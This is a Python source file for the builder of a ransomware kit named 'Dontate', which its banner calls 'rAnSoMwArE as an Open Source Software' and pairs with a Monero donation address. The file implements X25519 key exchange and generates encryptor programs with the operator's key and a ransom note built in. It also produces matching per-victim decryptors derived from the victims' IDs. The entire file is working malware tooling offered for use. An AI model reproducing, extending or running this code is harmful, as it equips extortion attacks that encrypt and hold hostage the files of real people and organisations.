import os,sys
import base64
version = '1.4'
class x25519:
    def __init__(self):
        self.P = 2 ** 255 - 19
        self.A24 = 121665
    def cswap(self,swap, x_2, x_3):
        dummy = swap * ((x_2 - x_3) % self.P)
        x_2 = x_2 - dummy
        x_2 %= self.P
        x_3 = x_3 + dummy
        x_3 %= self.P
        return (x_2, x_3)
    #Based on https://tools.ietf.org/html/rfc7748
    def X25519(self,k, u):
        x_1 = u
        x_2 = 1
        z_2 = 0
        x_3 = u
        z_3 = 1
        swap = 0
        for t in reversed(range(255)):
            k_t = (k >> t) & 1
            swap ^= k_t
            x_2, x_3 = self.cswap(swap, x_2, x_3)
            z_2, z_3 = self.cswap(swap, z_2, z_3)
            swap = k_t
            A = x_2 + z_2
            A %= self.P
            AA = A * A
            AA %= self.P
            B = x_2 - z_2
            B %= self.P
            BB = B * B
            BB %= self.P
            E = AA - BB
            E %= self.P
            C = x_3 + z_3
            C %= self.P
            D = x_3 - z_3
            D %= self.P
            DA = D * A
            DA %= self.P
            CB = C * B
            CB %= self.P
            x_3 = ((DA + CB) % self.P)**2
            x_3 %= self.P
            z_3 = x_1 * (((DA - CB) % self.P)**2) % self.P
            z_3 %= self.P
            x_2 = AA * BB
            x_2 %= self.P
            z_2 = E * ((AA + (self.A24 * E) % self.P) % self.P)
            z_2 %= self.P
        x_2, x_3 = self.cswap(swap, x_2, x_3)
        z_2, z_3 = self.cswap(swap, z_2, z_3)
        return (x_2 * pow(z_2, self.P - 2, self.P)) % self.P
    def decodeScalar25519(self,k):
         k_list = [(b) for b in k]
         k_list[0] &= 248
         k_list[31] &= 127
         k_list[31] |= 64
         return self.decodeLittleEndian(k_list)
    def decodeLittleEndian(self,b):
        return sum([b[i] << 8*i for i in range( 32 )])
    def unpack2(self,s):
        if len(s) != 32:
            raise ValueError('Invalid Curve25519 scalar (len=%d)' % len(s))
        t = sum(s[i] << (8 * i) for i in range(31))
        t += ((s[31] & 0x7f) << 248)
        return t
    def pack(self,n):
        return b''.join([int.to_bytes((n >> (8 * i)) & 255,1,'little') for i in range(32)])
    def clamp(self,n):
        n &= ~7
        n &= ~(128 << 8 * 31)
        n |= 64 << 8 * 31
        return n
    #Return nself.P
    def multscalar(self,n, p):
        n = self.clamp(self.decodeScalar25519(n))
        p = self.unpack2(p)
        return self.pack(self.X25519(n, p))
    #Start at x=9. Find point n times x-point
    def base_point_mult(self,n):
        n = self.clamp(self.decodeScalar25519(n))
        return self.pack(self.X25519(n, 9))
class Curve25519:
    def genkeypair():
        private = os.urandom(32)
        public = x25519().base_point_mult(private)
        return (public,private)
    def exchange(mypub,private):
        return x25519().multscalar(private,mypub)
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
def ID2Bytes(ID):
    byte = base64.b64decode(ID.encode())
    if len(byte) != 33:
        return False
    v = byte[-1:]
    byte = byte[:-1]
    add = 0
    for b in byte:
        add += b
    if add%256 == int.from_bytes(v,'little'):
        return byte
    return False
def Save(context):
    try:
        path = input(bcolors.WARNING+'[?] Input your save path(ex:D:\\test.py):'+bcolors.ENDC)
        with open(path,'w') as f:
            f.write("# Build with Dontate"+version+'\n'+context)
        print(bcolors.OKBLUE+'Done!'+bcolors.ENDC)
        return True
    except Exception as e:
        print(e)
        return False
def GenEnc(mypub,note,file_flag,endwith,note_file):
    with open('./encryptor/main.py','r') as f:
        temp = f.read()
    temp = temp.replace('{{mypub}}','mypub = '+str(mypub))
    temp = temp.replace('{{note}}','note = """'+note+'"""')
    temp = temp.replace('{{file_flag}}','file_flag = '+str(file_flag))
    temp = temp.replace('{{endwith}}','endwith = "'+endwith+'"')
    temp = temp.replace('{{note_file}}','note_file = "'+note_file+'"')
    return temp
def GenDec(shared,file_flag,endwith):
    with open('./decryptor/main.py','r') as f:
        temp = f.read()
    temp = temp.replace('{{shared}}','shared = '+str(shared))
    temp = temp.replace('{{endwith}}','endwith = "'+endwith+'"')
    temp = temp.replace('{{file_flag}}','file_flag = '+str(file_flag))
    return temp
def Enc():
    label = input(bcolors.WARNING+'[?] Input your key label:'+bcolors.ENDC)
    if label not in all_key:
        print('Not Found the key:'+label)
        return False
    key = all_key[label]
    mypub = key[0]
    notef = input(bcolors.WARNING+'[?] Input your note file path:'+bcolors.ENDC)
    try:
        with open(notef,'r') as f:
            note = f.read()
    except Exception as e:
        print(e)
        return False
    if '{{ID}}' not in note:
        print('This note is not valid!')
        return False
    flag = input(bcolors.WARNING+'[?] Input your file flag(default is abbccddeeff0):'+bcolors.ENDC)
    if flag == '':
        flag = 'abbccddeeff0'
    flag = bytes.fromhex(flag)
    endwith = input(bcolors.WARNING+'[?] Input your endwith:'+bcolors.ENDC)
    nfn = input(bcolors.WARNING+'[?] Input your note file name(default is README.txt):'+bcolors.ENDC)
    if nfn == '':
        nfn = 'README.txt'
    Save(GenEnc(mypub,note,flag,endwith,nfn))
    return True
def Dec():
    label = input(bcolors.WARNING+'[?] Input your key label:'+bcolors.ENDC)
    if label not in all_key:
        print('Not Found the key:'+label)
        return False
    key = all_key[label]
    private = key[1]
    ID = input(bcolors.WARNING+'[?] Input ID:'+bcolors.ENDC)
    byte = ID2Bytes(ID)
    if byte == False:
        print(bcolors.FAIL+'[!] This ID is not valid'+bcolors.ENDC)
        return False
    print(bcolors.OKBLUE+'[+] Pub key:'+str(byte)+bcolors.ENDC)
    print('Exchange...')
    shared = Curve25519.exchange(byte,private)
    print(bcolors.OKBLUE+'[+] Shared key:'+str(shared)+bcolors.ENDC)
    flag = input(bcolors.WARNING+'[?] Input your file flag(default is abbccddeeff0):'+bcolors.ENDC)
    if flag == '':
        flag = 'abbccddeeff0'
    flag = bytearray(bytes.fromhex(flag))
    endwith = input(bcolors.WARNING+'[?] Input your endwith:'+bcolors.ENDC)
    Save(GenDec(shared,flag,endwith))
    return True
def init():
    global all_key
    all_key = {}
    for parent, dirnames, filenames in os.walk('./key'):
        for filename in filenames:
            file_path = os.path.join(parent, filename)
            extensions = os.path.splitext(file_path)[1]
            if extensions == '.key':
                if os.path.getsize(file_path) == 64:
                    key = [0,0]
                    with open(file_path,'rb') as f:
                        a = f.read()
                        key[0] = a[:32]
                        key[1] = a[32:]
                    all_key[os.path.splitext(filename)[0]] = key
def main():
    os.system('cls')
    logo = bcolors.FAIL+r''' ____              _        _
|  _ \  ___  _ __ | |_ __ _| |_ ___
| | | |/ _ \| '_ \| __/ _` | __/ _ \
| |_| | (_) | | | | || (_| | ||  __/
|____/ \___/|_| |_|\__\__,_|\__\___|
===rAnSoMwArE as an Open Source Software===
V'''+version+''' Beta
by - SnakeH
donate(monero):497Qg6nGRAHLFxLLwpiMpoEE6QKRZWQHPSEN9DUttcLn5zdW3xn8PKUQDqS7Ui3qUpZ5YTm6QtMBKjfMXjk6BhL9GquRXnX
'''+bcolors.ENDC
    print(logo)
    print(bcolors.OKBLUE+'[*] Initializing...'+bcolors.ENDC)
    init()
    print(bcolors.WARNING+'[?] What do you want to do'+bcolors.ENDC)
    print('''
             [1] Gen a Encryptor
             [2] Gen a Decryptor
             [3] Show all of the key
             [4] Gen a new key
             ''')
    want = input('Input your choose:')
    if want == '1':
        Enc()
    elif want == '2':
        Dec()
    elif want == '3':
        print(all_key)
    elif want == '4':
        print('Run - keygen.py')
    else:
        print('I dont know what is "'+want+'"!')
    print('So,Goodbye!')
    input('Press Enter to exit...')
    exit()
main()
